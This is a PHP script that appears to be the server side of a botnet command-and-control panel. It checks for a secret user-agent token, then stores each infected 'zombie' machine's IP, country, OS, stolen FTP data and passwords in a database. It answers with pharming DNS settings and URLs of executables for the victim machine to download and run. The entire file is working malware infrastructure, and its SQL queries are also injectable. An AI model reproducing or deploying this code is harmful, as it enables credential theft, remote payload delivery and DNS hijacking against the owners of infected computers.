<?php
require_once('Class/class.base.de.datos.php');
require_once('Configs/Configs.php');


$incs="Controladores/geoip.inc";
$ipbs="Controladores/geoip.dat";
 # Country code 
 include_once($incs);
 $gi=geoip_open($ipbs, GEOIP_STANDARD);
 $cc=geoip_country_code_by_addr($gi,getenv("REMOTE_ADDR")); 
 if(empty($cc)) $cc = "Desconosido";
 geoip_close($gi);

 # Country name
 include_once($incs);
 $gi=geoip_open($ipbs, GEOIP_STANDARD);
 $cn=geoip_country_name_by_addr($gi,getenv("REMOTE_ADDR"));
 if(empty($cn)) $cn = "Desconosido";
 geoip_close($gi);
$header = cleanstring($_SERVER['HTTP_USER_AGENT']);
if($header == "753cda8b05e32ef3b82e0ff947a4a936"){
	$Name = $_POST['name'] ;
	$SO = $_POST['so']; 
	$zila = $_POST['file'];
	$Pasw = $_POST['pasw'];
	$ip = getenv("REMOTE_ADDR");
	$host = gethostbyaddr($ip);
	
	
	$Zombie = $DB->Select("SELECT * FROM zombis WHERE name='".$Name."'");
	if( count($Zombie) <= 0 ){
		$Sql = "INSERT INTO zombis 
		(id , name , fecha , ip , host , pais , flag , pharming , http , so , ftps , pasw , a)
		VALUES (NULL , '".$Name."' , NULL , '".$ip."' , '".$host."' , '".$cn."' , '".$cc."' , '1' , '1' , '".$SO."' , '".$zila."' ,  '".$Pasw."' , 1);" ;
		$DB->Query($Sql);
	} else {
	
	$X = @rand(0,99999999999);
		$DB->Query("UPDATE zombis SET ip='".getenv("REMOTE_ADDR")."' , pais='".$cn."' , flag='".$cc."' , so='".$SO."' , ftps='".$zila."' , pasw='".$Pasw."' , a='".$X."' WHERE name='".$Name."'") ;

	}









$Zombis = $DB->Select("SELECT * FROM  zombis WHERE name='".$Name."'");
$Pharming = $DB->Select("SELECT * FROM pharming");
$Exe = $DB->Select("SELECT * FROM http");
$Url = $DB->Select("SELECT * FROM urls");
 

 
if ($Zombis[0]['pharming'] =="1")
{
      echo "|",$Pharming[0]['pharming'],"|";
   }
   else
      echo "|","XXXXXXDNS","|";
if ($Zombis[0]['http'] =="1")
{
      echo $Exe[0]['http'],"|",$Exe[0]['Execute'];
	  
if($Url[0]['Urls'] == "http://")
{
	 echo  "|";
	 }
	 
   else
	 echo "|",$Url[0]['Urls'];
   }
   
if($Url[0]['Urls2'] == "http://")
{
	 echo  "|";
	 }
	 
   else
	 echo "|",$Url[0]['Urls2'];
   }
   else
      echo "http://","|","C:\Windows\Temp","|","","|";


?>